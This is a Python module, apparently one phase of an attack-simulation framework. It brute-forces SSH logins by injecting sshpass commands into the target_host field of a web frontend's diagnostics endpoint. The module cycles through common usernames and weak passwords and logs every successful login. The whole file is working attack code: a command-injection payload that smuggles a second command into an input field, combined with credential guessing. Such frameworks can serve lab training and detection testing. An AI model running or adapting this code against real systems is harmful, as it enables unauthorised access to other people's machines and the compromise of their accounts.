#!/usr/bin/env python3
"""
Phase 6: SSH Brute Force Attack
Attempts dictionary attacks against discovered SSH services.

MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing
"""

import logging

from .base_attacker import BaseAttacker

logger = logging.getLogger(__name__)


class SSHBruteForce(BaseAttacker):
    """Performs dictionary-based SSH brute force via command injection on the frontend."""

    def __init__(self, frontend_url: str = "http://frontend:3000") -> None:
        super().__init__(frontend_url)

    def brute_force_ssh(self, target_hosts: list) -> list:
        """Attempt SSH brute force attacks using a credential dictionary."""
        logger.info("\n[SSH BRUTE FORCE] Attempting SSH brute force attacks...")

        usernames = ["admin", "administrator", "root"]
        passwords = ["123456", "admin123", "password123"]

        brute_force_payloads = [
            (
                f"{host}; sshpass -p '{password}' ssh -o ConnectTimeout=3 "
                f"-o StrictHostKeyChecking=no {username}@{host} 'whoami' 2>/dev/null "
                f"&& echo 'SSH_SUCCESS:{username}:{password}@{host}'"
            )
            for host in target_hosts
            for username in usernames
            for password in passwords
        ]

        successful_logins = []

        for i, payload in enumerate(brute_force_payloads, 1):
            logger.info("-" * 50)
            logger.info("SSH brute force attempt %d/%d: '%s...'", i, len(brute_force_payloads), payload[:100])

            try:
                response = self.session.post(
                    f"{self.frontend_url}/diagnostics",
                    json={"system_check": "ping", "target_host": payload},
                    headers={"Content-Type": "application/json"},
                )

                if response.status_code == 200:
                    result = response.json()
                    if result.get("success"):
                        output = result.get("output", "")
                        if "SSH_SUCCESS" in output:
                            logger.info("✅ SSH LOGIN SUCCESSFUL!")
                            logger.info("   Output: %s", output)
                            successful_logins.append(output)
                        else:
                            logger.info("❌ SSH login failed")
                    else:
                        logger.warning("❌ SSH brute force failed: %s", result.get("error", "Unknown error"))
                else:
                    logger.warning("❌ HTTP %s: %s", response.status_code, response.text[:100])
            except Exception as e:
                logger.error("❌ SSH brute force failed: %s", e)

            logger.info("-" * 50)

        if successful_logins:
            logger.info("\nSSH BRUTE FORCE SUCCESS SUMMARY:")
            for login in successful_logins:
                logger.info("   ✅ %s", login)
        else:
            logger.warning("\n❌ No successful SSH logins found")

        logger.info("-" * 50)
        return successful_logins

    def run_ssh_attack(self, target_hosts: list) -> list:
        """Run the complete SSH attack sequence."""
        logger.info("\n[SSH ATTACK] Starting SSH brute force attack...")
        return self.brute_force_ssh(target_hosts)
